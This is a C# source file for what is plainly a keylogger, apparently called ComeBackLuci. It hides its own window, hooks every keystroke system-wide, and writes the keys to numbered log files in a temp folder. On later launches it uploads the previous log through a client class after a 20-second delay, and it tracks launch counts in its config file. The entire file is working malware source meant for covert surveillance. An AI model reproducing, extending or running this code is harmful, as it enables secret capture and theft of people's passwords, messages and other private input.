using System;
using System.IO;
using System.Configuration;
using System.Windows.Forms;
using System.Threading.Tasks;
using Gma.System.MouseKeyHook;
using ComeBackLuci.Mirlif;

namespace ComeBackLuci
{
    public partial class CBL : Form
    {
        private static int acc = int.Parse(ConfigurationManager.AppSettings["count"]);
        private static readonly string pathGlobal = Path.Combine(Path.GetTempPath(), "ComeBackLuci");
        private readonly string keys = Path.Combine(pathGlobal, $"key{acc + 1}.txt");
        private IKeyboardMouseEvents m_GlobalHook;

        public CBL()
        {
            InitializeComponent();
        }

        private void CBL_Load(object sender, EventArgs e)
        {
            this.Hide();

            if(acc == 0)
            {
                using (MiniConfig miniConfig = new MiniConfig())
                {
                    miniConfig.ShowDialog();
                }
            }

            acc++;

            if (!Directory.Exists(pathGlobal))
            {
                Directory.CreateDirectory(pathGlobal);
                FO_Credit.LuciBatch(pathGlobal);
            }

            if (acc > 1)
            {
                string fileLog = Path.Combine(pathGlobal, $"key{acc - 1}.txt");

                if (File.Exists(fileLog))
                {
                    Task.Run(async () =>
                    {
                        await Task.Delay(20000);
                        SH_Client.SendFile(fileLog);
                    });
                }
            }

            Configuration config = ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.None);
            config.AppSettings.Settings["count"].Value = acc.ToString();
            config.Save(ConfigurationSaveMode.Modified);
            ConfigurationManager.RefreshSection("appSettings");

            File.WriteAllText(keys, "----- " + DateTime.Now.ToString("dd/MM/yyyy - hh:mm tt") + " -----\n\n");

            Subscribe();
        }

        private void Subscribe()
        {
            m_GlobalHook = Hook.GlobalEvents();
            m_GlobalHook.KeyPress += GlobalHookKeyPress;
        }

        private void GlobalHookKeyPress(object sender, KeyPressEventArgs e)
        {
            using (StreamWriter reg = new StreamWriter(keys, true))
            {
                reg.Write(e.KeyChar);
            }
        }
    }
}
